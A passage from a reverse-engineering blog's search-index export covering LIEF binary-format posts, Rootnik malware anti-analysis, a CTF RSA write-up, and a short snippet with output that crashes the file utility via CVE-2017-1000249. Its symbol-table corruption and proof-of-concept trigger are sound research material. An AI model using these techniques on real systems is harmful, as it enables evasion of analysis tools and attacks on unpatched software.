a new entry in .dynamic section.\nAs mentioned at the beginning, we can now add new entries in the .dynamic so let\u0026rsquo;s add a DT_RUNPATH entry with the $ORIGIN value so that the Linux loader resolves the modified libgcrypt.so.20 instead of the system one:\n1 2 3 4 5 6 7 ... # Add a DT_RUNPATH entry gpg += lief.ELF.DynamicEntryRunPath(\u0026#34;$ORIGIN\u0026#34;) # Write back binary.write(gpg.name) libgcrypt.write(libgcrypt.name) And we don\u0026rsquo;t need the LD_LIBRARY_PATH anymore:\n$ readelf -d ./gpg|grep RUNPATH 0x000000000000001d (RUNPATH) Library runpath: [$ORIGIN] $ ./gpg --decrypt ./bar.txt gpg: AES encrypted data gpg: encrypted with 1 passphrase Hello World Hiding its symbols While IDA v7.0 has been released recently, among the changelog one can notice two changes:\nELF: describe symbols using symtab from DYNAMIC section ELF: IDA now uses the PHT by default instead of the SHT to load segments from ELF files These changes are partially true. Let\u0026rsquo;s see what go wrong in IDA with the following snippet:\n1 2 3 4 id = lief.parse(\u0026#34;/usr/bin/id\u0026#34;) dynsym = id.get_section(\u0026#34;.dynsym\u0026#34;) dynsym.entry_size = dynsym.size // 2 id.write(\u0026#34;id_test\u0026#34;) This snippet defines the size of one symbol as the entire size of .dynsym section divided by 2. The normal size of ELF symbols would be:\n\u0026gt;\u0026gt;\u0026gt; print(int(lief.ELF.ELF32.SIZES.SYM)) # For 32-bits 16 \u0026gt;\u0026gt;\u0026gt; print(int(lief.ELF.ELF64.SIZES.SYM)) # For 64-bits 24 In the case of the 64-bits id binary, we set this size to 924.\nWhen opening id_test in IDA and forcing to use Segment for parsing and not Sections we get the following imports:\nOnly one import is resolved and the others are hidden.\nNote that id_test is still executable:\n$ id_test uid=1000(romain) gid=1000(romain) ... By using readelf we can still retrieve the symbols and we have an error indicating that symbol size is corrupted.\n$ readelf -s id_test readelf: Error: Section 5 has invalid sh_entsize of 000000000000039c readelf: Error: (Using the expected size of 24 for the rest of this dump) Symbol table \u0026#39;.dynsym\u0026#39; contains 77 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FUNC GLOBAL DEFAULT UND endgrent@GLIBC_2.2.5 (2) 2: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __uflow@GLIBC_2.2.5 (2) 3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND getenv@GLIBC_2.2.5 (2) 4: 0000000000000000 0 FUNC GLOBAL DEFAULT UND free@GLIBC_2.2.5 (2) 5: 0000000000000000 0 FUNC GLOBAL DEFAULT UND abort@GLIBC_2.2.5 (2) ... In LIEF the (dynamic) symbol table address is computed through the DT_SYMTAB from the PT_DYNAMIC segment.\nTo compute the number of dynamic symbols LIEF uses three heuristics:\nBased on hash tables (GNU Hash / Sysv Hash) Based on relocations Based on sections Malwares start to use this kind of corruption as we will see in the next part.\nRootnik Malware Rootnik is a malware targeting Android devices. It has been analyzed by Fortinet security researcher.\nA full analysis of the malware is available on the Fortinet blog.\nThis part is focused on the ELF format analysis of one component: libshell.\nActually there are two libraries libshella_2.10.3.1.so and libshellx_2.10.3.1.so. As they have the same purpose, we will use the x86 version.\nFirst if we look at the ELF sections of libshellx_2.10.3.1.so we can notice that the address, offset and size of some sections like .text, .init_array, .dynstr, .dynsym are set to 0.\nThis kind of modification is used to disturb tools that rely on sections to parse some ELF structures (like objdump, readelf, IDA \u0026hellip;)\n$ readelf -S ./libshellx-2.10.3.1.so There are 21 section headers, starting at offset 0x2431c: Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .dynsym DYNSYM 00000114 000114 000300 10 A 2 1 4 [ 2] .dynstr STRTAB 00000414 000414 0001e2 00 A 0 0 1 [ 3] .hash HASH 00000000 000000 000000 04 A 1 0 4 [ 4] .rel.dyn REL 00000000 000000 000000 08 A 1 0 4 [ 5] .rel.plt REL 00000000 000000 000000 08 AI 1 6 4 [ 6] .plt PROGBITS 00000000 000000 000000 04 AX 0 0 16 [ 7] .text PROGBITS 00000000 000000 000000 00 AX 0 0 16 [ 8] .code PROGBITS 00000000 000000 000000 00 AX 0 0 16 [ 9] .eh_frame PROGBITS 00000000 000000 000000 00 A 0 0 4 [10] .eh_frame_hdr PROGBITS 00000000 000000 000000 00 A 0 0 4 [11] .fini_array FINI_ARRAY 00000000 000000 000000 00 WA 0 0 4 [12] .init_array INIT_ARRAY 00000000 000000 000000 00 WA 0 0 4 [13] .dynamic DYNAMIC 0000ce50 00be50 0000f8 08 WA 2 0 4 [14] .got PROGBITS 00000000 000000 000000 00 WA 0 0 4 [15] .got.plt PROGBITS 00000000 000000 000000 00 WA 0 0 4 [16] .data PROGBITS 00000000 000000 000000 00 WA 0 0 16 [17] .bss NOBITS 0000d398 00c395 000000 00 WA 0 0 4 [18] .comment PROGBITS 00000000 00c395 000045 01 MS 0 0 1 [19] .note.gnu.gold-ve NOTE 00000000 00c3dc 00001c 00 0 0 4 [20] .shstrtab STRTAB 00000000 024268 0000b1 00 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), p (processor specific) If we open the given library in IDA we have no exports, no imports and no sections:\nBased on the segments and dynamic entries we can recover most of these information:\n.init_array address and size are available through the DT_INIT_ARRAY and DT_INIT_ARRAYSZ entries .dynstr address and size are available through the DT_STRTAB and DT_STRSZ .dynsym address is available through the DT_SYMTAB The script recover_shellx.py recovers the missing values, patch sections and rebuild a fixed library.\nNow if we open the new libshellx-2.10.3.1_FIXED.so we have access to imports / exports and some sections. The .init_array section contains 2 functions:\ntencent652524168491435794009 sub_60C0 The tencent652524168491435794009 function basically do a stack alignment and the sub_60C0 is one of the decryption routines2. This function is obfuscated with graph flattening and looks like to O-LLVM graph flattening passe3:\nFortunately there are few \u0026ldquo;relevant blocks\u0026rdquo; and there are not obfuscated.\nThe function sub_60C0 basically iterates over the program headers to find the encrypted one and decrypt it using a custom algorithm (based on shift, xor, etc).\nTriggering CVE-2017-1000249 The CVE-2017-1000249 is a stack based buffer overflow in the file utility. It affects the versions 5.29, 5.30 and 5.31.\nBasically the overflow occurs in the size of the note description.\nUsing LIEF we can trigger the overflow as follow:\n1 2 3 4 5 6 import lief target = lief.parse(\u0026#34;/usr/bin/id\u0026#34;) note_build_id = target[lief.ELF.NOTE_TYPES.BUILD_ID] note_build_id.description = [0x41] * 30 target.write(\u0026#34;id_overflow\u0026#34;) $ file --version file-5.29 magic file from /usr/share/file/misc/magic $ id_overflow uid=1000(romain) gid=1000(romain) ... $ file id_overflow *** buffer overflow detected ***: file terminated ./id_overflow: [1] 3418 abort (core dumped) file ./id_overflow Here is the commit that introduced the bug: 9611f3.\nPE The Load Config directory is now parsed into the LoadConfiguration object. This structure evolves with the Windows versions and LIEF has been designed to support this evolution. You can take a look at LoadConfigurationV0, LoadConfigurationV6.\nOne can find the different versions of this structure in the following directories:\ninclude/LIEF/PE/LoadConfigurations src/PE/LoadConfigurations The current version of LIEF is able to parse the structure up to Windows 10 build 15002 with the hotpatch table offset.\nHere are some examples of the LoadConfiguration API:\n\u0026gt;\u0026gt;\u0026gt; target = lief.parse(\u0026#34;PE64_x86-64_binary_WinApp.exe\u0026#34;) \u0026gt;\u0026gt;\u0026gt; target.has_configuration True \u0026gt;\u0026gt;\u0026gt; config = target.load_configuration \u0026gt;\u0026gt;\u0026gt; config.version WIN_VERSION.WIN10_0_15002 \u0026gt;\u0026gt;\u0026gt; hex(config.guard_rf_failure_routine) \u0026#39;0x140001040\u0026#39; LIEF also provides an API to serialize any ELF or PE objects into JSON4\nFor examples to transform LoadConfiguration object into JSON:\n\u0026gt;\u0026gt;\u0026gt; from lief import to_json \u0026gt;\u0026gt;\u0026gt; to_json(config) \u0026#39;{\u0026#34;characteristics\u0026#34;:248,\u0026#34;code_integrity\u0026#34;:{\u0026#34;catalog\u0026#34;:0,\u0026#34;catalog_offset\u0026#34;:0 ... }}\u0026#39; # Not fully printed One can also serialize the whole Binary object:\n\u0026gt;\u0026gt;\u0026gt; to_json(target) \u0026#39;{\u0026#34;data_directories\u0026#34;:[{\u0026#34;RVA\u0026#34;:0,\u0026#34;size\u0026#34;:0,\u0026#34;type\u0026#34;:\u0026#34;EXPORT_TABLE\u0026#34;},{\u0026#34;RVA\u0026#34;:62584,\u0026#34;section\u0026#34; ...}}\u0026#39; # # Not fully printed Mach-O For Mach-O binary, dynamic executables embed the LC_DYLD_INFO command which is associated with the dyld_info_command structure.\nThe structure is basically a list of offsets and sizes pointing to other data structures.\nFrom /usr/lib/mach-o/loader.h the structure looks like this:\nstruct dyld_info_command { uint32_t cmd; uint32_t cmdsize; uint32_t rebase_off; uint32_t rebase_size; uint32_t bind_off; uint32_t bind_size; uint32_t weak_bind_off; uint32_t weak_bind_size; uint32_t lazy_bind_off; uint32_t lazy_bind_size; uint32_t export_off; uint32_t export_size; }; The dyld loader uses this structure to:\nRebase the executable Bind symbols to addresses Retrieve exported functions (or symbols) Whereas in the ELF and PE format relocations are basically a table, Mach-O format uses byte streams to rebase the image and to bind symbols with addresses. For exports it uses a trie as subjacent structure.\nIn the new version of LIEF, the Mach-O parser is able to handle these underlying structures to provide an user-friendly API:\nThe export trie is represented by the ExportInfo object which is usually tied to a Symbol. The binding byte stream is represented trough the BindingInfo object.\nFor the rebase byte stream, the parser create virtual relocations to model the rebasing process. These virtual relocations are represented by the RelocationDyld object and among other attributes it contains address, size and type5.\nHere is an example using the Python API:\n\u0026gt;\u0026gt;\u0026gt; id = lief.parse(\u0026#34;/usr/bin/id\u0026#34;) \u0026gt;\u0026gt;\u0026gt; print(id.relocations[0]) 100002000 POINTER 64 DYLDINFO __DATA.__eh_frame dyld_stub_binder \u0026gt;\u0026gt;\u0026gt; print(id.has_dyld_info) True \u0026gt;\u0026gt;\u0026gt; dyldinfo = id.dyld_info \u0026gt;\u0026gt;\u0026gt; print(dyldinfo.bindings[0]) Class: STANDARD Type: POINTER Address: 0x100002010 Symbol: ___stderrp Segment: __DATA Library: /usr/lib/libSystem.B.dylib \u0026gt;\u0026gt;\u0026gt; print(dyldinfo.exports[0]) Node Offset: 18 Flags: 0 Address: 0 Symbol: __mh_execute_header Conclusion In this release we did a large improvement of the ELF builder. Mach-O and PE parts gain new objects and new functions. LIEF is now available on pypi and can be added in the requirements of Python projects whatever the Python version and the target platform.\nSince the v0.7.0 LIEF has been presented at RMLL and the MISP project uses it for its PyMISP objects.\nSome may complain about the C API. They are right! Until the v1.0.0 we will provide a minimal C API. Once C++ API is stable we plan to provide full APIs for Python, C, Java, OCaml6, etc.\nNext version should be focused on the Mach-O builder especially for adding sections and segments. We also plan to support PE .NET headers and fix some performances issues.\nFor questions you can join the Gitter channel.\nAll Python examples are done with the 3.5 version\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nAs mentioned in the Fortinet blog post, the library is packed.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nSee the blog post about O-LLVM analysis: https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nThis feature is not yet available for MachO objects\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nDue to the inheritance relationship and abstraction these attributes are located in the MachO::Relocation and LIEF::Relocation objects.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://github.com/aziem/LIEF-ocaml\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":1509580800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"cf00a4f3c76204c3d8227e79af543ab0","permalink":"https://www.romainthomas.fr/post/17-11-have-fun-with-lief-and-executable-formats/","publishdate":"2017-11-02T00:00:00Z","relpermalink":"/post/17-11-have-fun-with-lief-and-executable-formats/","section":"post","summary":"This blog post introduces new features of LIEF as well as some uses cases.","tags":["lief"],"title":"Have fun with LIEF and Executable Formats","type":"post"},{"authors":["Romain Thomas"],"categories":null,"content":"When analyzing executable, the first layer of information is the format in which the executable is wrapped. It turns out that a lot of tools and libraries exist to analyze and instrument machine code wrapped by the format, but there is not such library to handle the three mainstream executable formats and to both read and modify these formats. LIEF has been developed to that end.\nIn the talk we will explain the rationale behind LIEF architecture choices, what LIEF allows to do and have a look at use cases.\nLIEF is a cross platform library and it can be used through a Python, C++ and C API. The library enables to parse standard structures as well as more complex ones like PE Signature (Authenticode) and ELF hash table. As use cases we can inject code into a binary or a library, we can also redirect the control flow to hook functions and it can be used to obfuscate some parts of a binary. Another feature of LIEF is that common characteristics of these formats are factorized so that we can develop a single script which works for the three formats.\nSlides of the talk given at RMLL You can also grab the slides of the talk given at Cybersecurity France-Japan: 17-04-cybersecurity-frjp-LIEF.pdf\n","date":1499126400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"b4e3c965220814581b363ec08db9d7ae","permalink":"https://www.romainthomas.fr/publication/lief/","publishdate":"2017-07-04T00:00:00Z","relpermalink":"/publication/lief/","section":"publication","summary":"When analyzing executable, the first layer of information is the format in which the executable is wrapped. It turns out that a lot of tools and libraries exist to analyze and instrument machine code wrapped by the format, but there is not such library to handle the three mainstream executable formats and to both read and modify these formats. LIEF has been developed to that end.\nIn the talk we will explain the rationale behind LIEF architecture choices, what LIEF allows to do and have a look at use cases.","tags":null,"title":"LIEF: Library to Instrument Executable Formats","type":"publication"},{"authors":["Romain Thomas"],"categories":null,"content":" This post has been originally posted on the Quarkslab\u0026rsquo;s blog Executable File Formats in a Nutshell When dealing with executable files, the first layer of information is the format in which the code is wrapped. We can see an executable file format as an envelope. It contains information so that the postman (i.e. Operating System) can handle and deliver (i.e. execute) it. The message wrapped by this envelope would be the machine code.\nThere are mainly three mainstream formats, one per OS:\nPortable Executable (PE) for Windows systems Executable and Linkable Format (ELF) for UN*X systems (Linux, Android\u0026hellip;). Mach-O for OS-X, iOS\u0026hellip; Other executable file formats, such as COFF, exist but they are less relevant.\nUsually each format has a header which describes at least the target architecture, the program\u0026rsquo;s entry point and the type of the wrapped object (executable, library\u0026hellip;) Then we have blocks of data that will be mapped by the OS\u0026rsquo;s loader. These blocks of data could hold machine code (.text), read-only data (.rodata) or other OS specific information.\nFor PE there is only one kind of such block: Section. For ELF and Mach-O formats, a section has a different meaning. In these formats, sections are used by the linker at the compilation step, whereas segments (second type of block) are used by the OS\u0026rsquo;s loader at execution step. Thus sections are not mandatory for ELF and Mach-O formats and can be removed without affecting the execution.\nPurpose of LIEF It turns out that many projects need to parse executable file formats but don\u0026rsquo;t use a standard library and re-implement their own parser (and the wheel). Moreover, these parsers are usually bound to one language.\nOn Unix system one can find the objdump and objcopy utilities but they are limited to Unix and the API is not user-friendly.\nThe purpose of LIEF is to fill this void:\nProviding a cross platform library which can parse and modify (in a certain extent) ELF, PE and Mach-O formats using a common abstraction Providing an API for different languages (Python, C++, C\u0026hellip;) Abstract common features from the different formats (Section, header, entry point, symbols\u0026hellip;) The following snippets show how to obtain information about an executable using different API of LIEF:\nimport lief # ELF binary = lief.parse(\u0026#34;/usr/bin/ls\u0026#34;) print(binary) # PE binary = lief.parse(\u0026#34;C:\\\\Windows\\\\explorer.exe\u0026#34;) print(binary) # Mach-O binary = lief.parse(\u0026#34;/usr/bin/ls\u0026#34;) print(binary) With the C++ API:\n#include \u0026lt;LIEF/LIEF.hpp\u0026gt; int main(int argc, const char** argv) { LIEF::ELF::Binary* elf = LIEF::ELF::Parser::parse(\u0026#34;/usr/bin/ls\u0026#34;); LIEF::PE::Binary* pe = LIEF::PE::Parser::parse(\u0026#34;C:\\\\Windows\\\\explorer.exe\u0026#34;); LIEF::MachO::Binary* macho = LIEF::MachO::Parser::parse(\u0026#34;/usr/bin/ls\u0026#34;); std::cout \u0026lt;\u0026lt; *elf \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; *pe \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; *macho \u0026lt;\u0026lt; std::endl; delete elf; delete pe; delete macho; } And finally with the C API:\n#include \u0026lt;LIEF/LIEF.h\u0026gt; int main(int argc, const char** argv) { Elf_Binary_t* elf_binary = elf_parse(\u0026#34;/usr/bin/ls\u0026#34;); Pe_Binary_t* pe_binary = pe_parse(\u0026#34;C:\\\\Windows\\\\explorer.exe\u0026#34;); Macho_Binary_t** macho_binaries = macho_parse(\u0026#34;/usr/bin/ls\u0026#34;); Pe_Section_t** pe_sections = pe_binary-\u0026gt;sections; Elf_Section_t** elf_sections = elf_binary-\u0026gt;sections; Macho_Section_t** macho_sections = macho_binaries[0]-\u0026gt;sections; for (size_t i = 0; pe_sections[i] != NULL; ++i) { printf(\u0026#34;%s\\n\u0026#34;, pe_sections[i]-\u0026gt;name) } for (size_t i = 0; elf_sections[i] != NULL; ++i) { printf(\u0026#34;%s\\n\u0026#34;, elf_sections[i]-\u0026gt;name) } for (size_t i = 0; macho_sections[i] != NULL; ++i) { printf(\u0026#34;%s\\n\u0026#34;, macho_sections[i]-\u0026gt;name) } elf_binary_destroy(elf_binary); pe_binary_destroy(pe_binary); macho_binaries_destroy(macho_binaries); } LIEF supports FAT-MachO and one can iterate over binaries as follows:\nimport lief binaries = lief.MachO.parse(\u0026#34;/usr/lib/libc++abi.dylib\u0026#34;) for binary in binaries: print(binary) Note The above script uses the lief.MachO.parse function instead of the lief.parse function because lief.parse returns a single lief.MachO.binary object whereas lief.MachO.parse returns a list of lief.MachO.binary (according to the FAT-MachO format). Along with standard format components like headers, sections, import table, load commands, symbols, etc. LIEF is also able to parse PE Authenticode:\nimport lief driver = lief.parse(\u0026#34;driver.sys\u0026#34;) for crt in driver.signature.certificates: print(crt) Version: 3 Serial Number: 61:07:02:dc:00:00:00:00:00:0b Signature Algorithm: SHA1_WITH_RSA_ENCRYPTION Valid from: 2005-9-15 21:55:41 Valid to: 2016-3-15 22:5:41 Issuer: DC=com, DC=microsoft, CN=Microsoft Root Certificate Authority Subject: C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Windows Verification PCA ... Full API documentation is available here\nPython API C++ API C API Architecture In the LIEF architecture, each format implements at least the following classes:\nParser: Parse the format and decompose it into a Binary class Binary: Modelize the format and provide an API to modify and explore it. Builder: Transform the binary object into a valid file. To factor common characteristics in formats we have an inheritance relationship between these characteristics.\nFor symbols it gives the following diagram:\nIt enables to write cross-format utility like nm. nm is a Unix utility to list symbols in an executable. The source code is available here: binutils\nWith the given inheritance relationship one can write this utility for the three formats in a single script:\nimport lief import sys def nm(binary): for symbol in binary.symbols: print(symbol) return 0 if __name__ == \u0026#34;__main__\u0026#34;: r = nm(sys.argv[1]) sys.exit(r) Conclusion As LIEF is still a young project we hope to have feedback, ideas, suggestions and pull requests.\nThe source code is available here: https://github.com/lief-project (under Apache 2.0 license) and the associated website: http://lief.quarkslab.com\nIf you are interested in use cases, you can take a look at these tutorials:\nParse and manipulate formats Create a PE from scratch Play with ELF symbols Hooking Infecting the PLT/GOT The project will be presented at the Third French Japanese Meeting on Cybersecurity\nContact lief [at] quarkslab [dot] com Gitter: lief-project Thanks Thanks to Serge Guelton and Adrien Guinet for their advice about the design and their code review. Thanks to Quarkslab for making this project open-source.\n","date":1491264e3,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"b9bd4190cd2fa4a30e4a6592ed242529","permalink":"https://www.romainthomas.fr/post/lief-release/","publishdate":"2017-04-04T00:00:00Z","relpermalink":"/post/lief-release/","section":"post","summary":"We are open-sourcing LIEF, a library to parse and manipulate ELF, PE and Mach-O binary formats. This blog post explains the purpose of this project and some parts of its architecture.","tags":["lief"],"title":"Open-sourcing LIEF","type":"post"},{"authors":["Jonathan Salwan","Romain Thomas"],"categories":null,"content":" Slides Video ","date":1478736e3,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"1a0735ba90301927102613b40ff00d89","permalink":"https://www.romainthomas.fr/publication/triton-vm-protection/","publishdate":"2016-11-10T00:00:00Z","relpermalink":"/publication/triton-vm-protection/","section":"publication","summary":"The first part of the talk is going to be an introduction to the Triton framework to expose its components and to explain how they work together. Then, the second part will include demonstrations on how it's possible to reverse virtual machine based protections using taint analysis, symbolic execution, SMT simplifications and LLVM-IR optimizations. ","tags":null,"title":"How Triton can help to reverse virtual machine based software protections","type":"publication"},{"authors":["Romain Thomas"],"categories":null,"content":"The purpose of this project is to provide a cross platform library to parse, modify and abstract ELF, PE and MachO formats.\nIt turns out that many projects need to parse executable formats and they usually re-implement their own parser. Moreover these parsers are usually bound to one language.\nLIEF attempts to fill this void.\n","date":1461715200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"27b392443c4beb74582d91fdf0b881e8","permalink":"https://www.romainthomas.fr/project/lief/","publishdate":"2016-04-27T00:00:00Z","relpermalink":"/project/lief/","section":"project","summary":"LIEF is a Library to Instrument Executable Formats","tags":["lief","parser"],"title":"LIEF","type":"project"},{"authors":null,"categories":null,"content":"","date":1461715200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"466702894b9681de603c2d20894ce92c","permalink":"https://www.romainthomas.fr/projects-images/qlist/","publishdate":"2016-04-27T00:00:00Z","relpermalink":"/projects-images/qlist/","section":"projects-images","summary":"QList object layout from Qt 5.11.2","tags":["Qt","diagram"],"title":"QList","type":"projects-images"},{"authors":null,"categories":null,"content":"","date":1461715200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"079a1531ec30efe31f620e573d057fa0","permalink":"https://www.romainthomas.fr/projects-images/qstring/","publishdate":"2016-04-27T00:00:00Z","relpermalink":"/projects-images/qstring/","section":"projects-images","summary":"QString object layout from Qt 5.11.2","tags":["Qt","diagram"],"title":"QString","type":"projects-images"},{"authors":["Jonathan Salwan","Romain Thomas"],"categories":null,"content":" ","date":1460073600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"f5b338a9867ab7600598bc82969348e5","permalink":"https://www.romainthomas.fr/publication/dynamic-binary-analysis-and-obfuscation/","publishdate":"2016-04-08T00:00:00Z","relpermalink":"/publication/dynamic-binary-analysis-and-obfuscation/","section":"publication","summary":"At this presentation we will talk about how a DBA (Dynamic Binary Analysis) may help a reverse engineer to reverse obfuscated code. We will first introduce some basic obfuscation techniques and then expose how it's possible to break some stuffs (using our open-source DBA framework - Triton) like detect opaque predicates, reconstruct CFG, find the original algorithm, isolate sensible data and many more... Then, we will conclude with a demo and few words about our future work. ","tags":null,"title":"Dynamic Binary Analysis and Obfuscated Codes","type":"publication"},{"authors":["Romain Thomas"],"categories":["cryptography","write-up"],"content":"Introduction The crypto 300 challenge was about RSA with a special generation of the prime numbers $p$ and $q$. We were given a mail mail.msg which has been encrypted with RSA and whose the public key is in the hitbctf.crt certificate.\nRSA\u0026rsquo;s Parameters Construction The modulus $N$ is built by choosing randomly a first prime number $p$, the second prime number $q$ is constructed in the following way:\n$$\\alpha \\cdot (p - 1) \\equiv 1 \\pmod{e}$$\n$$q = (p\\alpha \\bmod e) + k\\cdot e$$\n$k$ is a positive integer such as $q$ is a prime number and $e$ is the public exponent which is also a random prime number.\nThe following code is the implementation in Python:\ndef gen_rsa_parameters(): r = os.urandom(63) e = int(r.encode(\u0026#39;hex\u0026#39;), 16) e = next_prime(e) r = os.urandom(64) p = int(r.encode(\u0026#39;hex\u0026#39;), 16) p = next_prime(p) q = (p*modinv(p-1, e)%e) while not is_prime(q): q += e N = p*q phi = (p-1)*(q-1) d = modinv(e,phi) return N,e,d,p,q Theoretical attack Let\u0026rsquo;s $N^{\\prime} = N \\bmod{e}$. So we have\n\\begin{align} N^{\\prime} \u0026amp; \\equiv \u0026amp; p \\cdot q \\pmod{e} \\\\\\ \u0026amp; \\equiv \u0026amp; p \\cdot ((p\\alpha \\bmod e) + k\\cdot e) \\pmod{e} \\\\\\ \u0026amp; \\equiv \u0026amp; p^2\\alpha \\pmod{e} \\\\\\ \\end{align}\nWe have $\\alpha$ in the equation so we can introduce $p - 1$ to remove $\\alpha$\n\\begin{align} N^{\\prime} \u0026amp; \\equiv \u0026amp; (p - 1 + 1)^2\\alpha \\pmod{e} \\\\\\ \u0026amp; \\equiv \u0026amp; (p - 1)^2\\alpha + 2(p - 1)\\alpha + \\alpha \\pmod{e} \\\\\\ \u0026amp; \\equiv \u0026amp; (p - 1) + 2 + \\alpha \\pmod{e} \\\\\\ (p - 1)N^{\\prime} \u0026amp; \\equiv \u0026amp; (p - 1)^2 + 2(p - 1) + 1 \\pmod{e} \\end{align}\n$$\\boxed{(p - 1)^2 - (N^{\\prime} - 2)(p - 1) + 1 \\equiv 0 \\pmod{e}}$$\nNow we have a quadratic equation which only depends on $p$.\nLet\u0026rsquo;s $X = p - 1$ and suppose that $N^{\\prime} - 2$ is even and $N^{\\prime} - 2 = 2b$.\n\\begin{align} X^2 - 2bX + 1 \u0026amp; \\equiv \u0026amp; 0 \u0026amp; \\pmod{e} \\\\\\ (X - b)^2 - b^2 + 1 \u0026amp; \\equiv \u0026amp; 0 \u0026amp; \\pmod{e}\\\\\\ (X - b)^2 \u0026amp; \\equiv \u0026amp; b^2 - 1 \u0026amp; \\pmod{e} \\end{align}\nby using quadratic residue we can find a solution. We can also use SAGE and the sqrt() function:\nNp = N % e b = (Np - 2) / 2 p = Mod(pow(b, 2) - 1, e).sqrt() + b + 1 At this point, we find $p \\bmod{e}$ but not $p$ !\nI tried to find $p$ by adding some $e$ but the distance between $p$ and $p \\bmod{e}$ is huge. So I had to find another way.\nBy knowing $p \\bmod{e}$ we can compute $\\alpha$. Remember $$\\alpha \\cdot (p - 1) \\equiv 1 \\pmod{e}$$ and by having $\\alpha$ and $p \\bmod{e}$ we can brute force $q$ by adding $e$ until $(p\\alpha \\bmod e) + k\\cdot e$ is prime and it divide $N$.\nWe did the assumption that $N^{\\prime} - 2$ has to be even (so $N^{\\prime}$ must be even) and in the certificate $N^{\\prime}$ is even so everything is right.\nPratical Attack First we have to extract the modulus $N$ and the public key $e$ from the certificate:\n$ openssl x509 -in hitbctf.crt -text -noout Certificate: Data: Version: 1 (0x0) Serial Number: 18379438180976429416 (0xff10e1a5ac5a0968) Signature Algorithm: sha1WithRSAEncryption Issuer: C=NL, ST=Noord-Holland, L=Amsterdam, O=HITB, OU=CTF Validity Not Before: May 24 09:58:26 2015 GMT Not After : May 23 09:58:26 2016 GMT Subject: C=NL, ST=Noord-Holland, L=Amsterdam, O=HITB, OU=CTF Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (1024 bit) Modulus: 00:e6:eb:89:c1:8d:49:c9:a2:02:2b:e0:b4:65:14: 6e:0f:90:45:1e:a3:4c:6b:60:56:00:4e:bd:15:59: 55:b1:35:96:c2:d6:83:ad:2f:23:6b:0b:2c:0e:0b: 88:83:b5:d6:cb:8a:0b:4f:f9:b7:eb:64:8c:95:2b: 6b:ef:5a:6f:04:f5:64:17:f5:1c:a9:14:d9:ea:73: e7:dd:c5:f2:0d:ce:c3:9c:e8:4b:72:2a:0c:f3:d8: 5e:80:ce:78:64:63:e1:44:f6:1d:b5:9c:cf:45:ff: 0e:d3:7f:d0:ce:bd:37:a5:8d:8a:4b:08:33:9e:a3: 2c:bc:ab:61:64:03:fd:2c:c5 Exponent: 69:60:2d:93:8a:81:5f:14:cf:9f:b8:36:c2:e0:4d: 4d:De:82:ba:fc:8d:56:c2:6d:8c:89:ef:3c:40:69: 5d:d5:d4:ef:a7:36:36:43:15:14:95:f3:8c:bf:24: ae:94:30:92:40:79:12:00:1b:17:f5:53:33:9e:92: 70:70:49 Signature Algorithm: sha1WithRSAEncryption 17:2b:ea:be:90:ad:98:f2:2b:ff:f5:61:d3:ea:af:fb:35:3a: 67:10:91:13:db:60:55:d9:09:8b:c2:1a:cf:6b:c6:1f:f2:10: 7a:d1:7b:9d:ff:10:f2:f2:c0:a9:f5:aa:2e:09:93:40:88:92: 7d:98:ff:e1:cb:dc:db:35:8d:e0:4b:21:99:76:bf:db:04:a2: 62:a4:18:4e:fc:bb:a7:53:be:6a:a1:ef:ec:15:86:c1:f1:1e: 87:6a:e9:af:fe:d1:08:eb:de:22:28:c4:5e:be:f1:41:0a:ca: cf:cf:da:63:b1:c1:56:e8:0c:8e:56:7f:08:94:0d:2b:2a:08: N = 1621575882314321757502664197090844942567381491984167028188381926885851 995558397927547394115469298694885747314992315746872071523931715177680193273 386465775883129725436206653605910592810579794603402792446164893148622893121 957048204358672599654432857497196823273138934901636721473789115585263150131 66594183212229\ne = 21558488234539889837938770635971330903489839146766895224490179041465516 1931455822669631548838317075220811407344210520390992334648372016602816069805 30249\nWith SAGE:\nsage: Np = N % e sage: b = (Np - 2) / 2 sage: pp = int(Mod(pow(b, 2) - 1, e).sqrt()) + b + 1 sage: alpha = inverse_mod(int(X), int(e)) sage: q = (pp * alpha) % e sage: while not is_prime(q) and N % q != 0: ....: q += e sage: p = N / q sage: p 13317713478157317654574552532079837937895228108820477140030796245493222349714497856652987583926206280627498615972491072112647669795345566943409669535038641 sage: q 12176083266650126897170100375931110708350668494730113414987801764299563774952801449439933220072280766145748279998832962142839152786620322097065894585706069 We can now generate the private key by using rsatool:\n$ ./rsatools.py -o private.pem \\ -e 21558488234539889837938770635971330903489839146766895224490179041465516193145582266963154883831707522081140734421052039099233464837201660281606980530249 \\ -p 13317713478157317654574552532079837937895228108820477140030796245493222349714497856652987583926206280627498615972491072112647669795345566943409669535038641 \\ -q 12176083266650126897170100375931110708350668494730113414987801764299563774952801449439933220072280766145748279998832962142839152786620322097065894585706069 Finally, we can decrypt the message:\nopenssl smime -decrypt -in 